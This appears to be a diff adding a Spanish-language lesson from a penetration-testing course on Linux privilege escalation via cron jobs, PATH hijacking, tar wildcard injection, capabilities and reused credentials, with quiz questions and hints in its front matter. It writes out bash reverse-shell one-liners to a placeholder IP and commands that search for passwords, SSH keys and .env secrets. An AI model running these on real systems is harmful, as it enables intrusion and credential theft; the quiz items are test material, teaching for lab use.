@@ -1,0 +1,85 @@
+---
+index: 3
+title: "Cron, PATH hijacking y el resto del arsenal"
+questions:
+  - id: privesc-linux-t03-q01
+    prompt: "Un cron job de root ejecuta /opt/scripts/backup.sh que llama 'tar' SIN ruta absoluta. ¿Cómo escalas?"
+    hint: "Crea un binario 'tar' malicioso en un directorio que esté antes en PATH."
+    kind: text
+  - id: privesc-linux-t03-q02
+    prompt: "¿Qué capability de Linux permite a un binario escuchar en puertos privilegiados sin ser root?"
+    hint: "cap_net_bind_service. La herramienta para ver capabilities: getcap."
+    kind: text
+  - id: privesc-linux-t03-q03
+    prompt: "Encuentras una credencial en un archivo de configuración (DB_PASSWORD=xyz en /opt/app/.env). ¿Qué haces?"
+    hint: "Prueba reutilización de credenciales..."
+    kind: choice
+    options:
+      - id: a
+        label: "Nada: solo sirve para la base de datos"
+      - id: b
+        label: "Probarla como contraseña de root y de otros usuarios (password reuse es ubicuo)"
+      - id: c
+        label: "Borrarla para ayudar"
+      - id: d
+        label: "Solo si es base64"
+---
+
+## Cron jobs: el tiempo ejecuta como root
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/
+```
+
+Tres vectores con cron:
+
+1. **Script escribible**: si `/opt/scripts/backup.sh` es escribible por tu usuario
+   pero lo ejecuta root via cron → añade `bash -i >& /dev/tcp/TU_IP/4444 0>&1`.
+2. **PATH hijacking**: el script llama `tar` (sin `/usr/bin/`) → crea `/tmp/tar`:
+   ```bash
+   echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > /tmp/tar
+   chmod +x /tmp/tar
+   export PATH=/tmp:$PATH   # solo si el cron HEREDA tu PATH (poco común)
+   ```
+   En la práctica: si el cron define `PATH=/usr/local/bin:...` y `/usr/local/bin`
+   es escribible → coloca tu binario ahí.
+3. **Wildcard injection**: si cron hace `tar czf backup.tar.gz /var/www/*` y puedes
+   crear archivos en /var/www → crea `--checkpoint=1` y `--checkpoint-action=exec=...`
+   (los wildcards expanden a flags de tar).
+
+## Capabilities (el primo moderno de SUID)
+
+```bash
+getcap -r / 2>/dev/null
+# cap_net_bind_service=ep → puede escuchar en <1024
+# cap_setuid=ep → puede cambiar UID (¡root!)
+```
+
+Un binario con `cap_setuid` que puedas ejecutar es escalada directa.
+
+## Credenciales reutilizadas (el vector humano)
+
+```bash
+grep -ri "password" /opt/ /home/ /var/www/ --include="*.env" --include="*.conf" 2>/dev/null
+grep -ri "pass" ~/.bash_history 2>/dev/null
+find / -name "*.env" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
+```
+
+Una contraseña encontrada en config se prueba contra: `su root`, `su admin`, SSH
+de otros usuarios, base de datos, panel de admin. **El password reuse es el vector
+más común en el mundo real** porque los humanos somos humanos.
+
+## Tu checklist final de privesc Linux
+
+```text
+□ sudo -l + GTFOBins
+□ SUID: find / -perm -4000
+□ Cron: /etc/crontab + cron.d + writables
+□ Capabilities: getcap -r /
+□ Credenciales: grep -ri "pass" en configs + .env + history
+□ PATH: directorios escribibles antes en PATH
+□ Kernel: searchsploit linux kernel $(uname -r)
+```
+
+Cada uno tiene su room de lab en los módulos avanzados del path.
